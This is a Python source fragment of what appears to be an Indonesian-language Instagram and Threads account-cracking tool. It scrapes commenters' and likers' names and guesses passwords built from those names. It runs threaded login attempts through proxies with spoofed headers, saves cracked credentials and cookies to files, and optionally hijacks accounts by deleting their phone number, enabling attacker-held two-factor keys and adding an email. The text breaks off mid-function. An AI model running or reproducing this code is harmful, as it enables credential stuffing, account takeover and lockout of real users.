                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/comments/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['comments']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
            
    def Dump_Likers(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/likers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Result(self, result, isi):
        if result in ('1','01'):
            for buka in open(f'/sdcard/OK/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f'\r╭ auth secure account',style='green'); true.add(f""status two {buka.split('|')[6]}""); true.add(f""secret key {buka.split('|')[7]}""); true.add(f""pemulihan {buka.split('|')[8]}""); true.add(f""telephone {buka.split('|')[9]}""); true.add(f""add email {buka.split('|')[10]}""); true.add(f""web email {buka.split('|')[11]}""); true = tree.add(f""Cookie {buka.split('|')[12]}""); tree.add(""Success cek in Result OK""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f""Cookie {buka.split('|')[6]}""); tree.add(""Success cek in Result OK""); printz(tree)
                    
        elif result in ('2','02'):
            for buka in open(f'/sdcard/2F/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='red'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                
        elif result in ('3','03'):
            for buka in open(f'/sdcard/CP/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='yellow'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result CP""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result CP""); printz(tree)   
            
    def Methode(self):
        try:
            self.Meterans.append(Panel(f'[bold green]01.[bold white] Methode [bold green]Api V1\n[bold green]02.[bold white] Methode [bold green]Api Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Api) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50', subtitle = ""╭─────"", subtitle_align = ""left""))
            self.Meterans.append(Panel(f'[bold green]03.[bold white] Methode [bold green]Ajax V1\n[bold green]04.[bold white] Methode [bold green]Ajax Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Ajax) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50'))
            Console().print(Columns(self.Meterans))
            Methode_Login = Console().input(""[bold grey50]   ╰─> "")
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Apakah Anda Ingin Menggunakan Auto Amankan Data Akun OK (y/t)"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Secure Akun) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Secure_Akun = Console().input(""[bold grey50]   ╰─> "")
            if Secure_Akun =='y' or Secure_Akun =='ya':
                self.amankan_akun.append('ya')
            self.Exec_Methode(Methode_Login)
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()                
        
    def Simpan_Result(self):
        self.waktu = datetime.datetime.now()
        self.bulan = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
        return(f'OK-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}', f'2F-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}',f'CP-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}')
        
    def Password(self, fullname):
        self.one = []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
            else: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
        
    def Exec_Methode(self, Methode_Login):
        try:
            self.result_ok,self.result_two,self.result_cp = self.Simpan_Result()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[bold green]•[bold white] Result OK Tersimpan Di Folder : [bold green]/sdcard/OK/{self.result_ok}\n[bold red]•[bold white] Result 2F Tersimpan Di Folder : [bold red]/sdcard/2F/{self.result_two}\n[bold green]•[bold white] Result CP Tersimpan Di Folder : [bold yellow]/sdcard/CP/{self.result_cp}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Result Instagram) [bold green]<[bold yellow]<[bold red]<""))
            Console(width = 65).print(Panel('[bold white]Mainkan Mode Pesawat Setiap 200 Looping Agar Terhindar Spam!',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Warning Spam) [bold green]<[bold yellow]<[bold red]<',style='white'))
            with ThreadPoolExecutor(max_workers=30) as V:
                for Username_And_Fullname in dump:
                    username, fullname = Username_And_Fullname.split('<=>')
                    password = self.Password(fullname)
                    if Methode_Login in ('1'):
                        V.submit(self.ExecApi, username,password)
                    elif Methode_Login in ('2'):
                        V.submit(self.ExecApi_Threads, username,password)
                    elif Methode_Login in ('3'):
                        V.submit(self.ExecAjax, username,password)
                    elif Methode_Login in ('4'):
                        V.submit(self.ExecAjax_Threads, username,password)
                    else: V.submit(self.ExecApi, username,password)
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Kamu Telah Mendapatkan [bold green]{self.success}[bold white] Hasil OK, [bold yellow]{self.chekpoint}[bold white] Hasil Checkpoint Dan [bold red]{self.faktor}[bold white] Hasil Two Faktor, Dari {len(dump)} Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Selesai) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()  
        
    def ExecApi(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://i.instagram.com/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'i.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://i.instagram.com/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi(username, password)
        self.looping+=1
        
    def ExecApi_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://www.threads.net/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'www.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi_Threads(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break   
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)                  
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi_Threads(username, password)
        self.looping+=1
            
    def ExecAjax(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.instagram.com/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.instagram.com/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
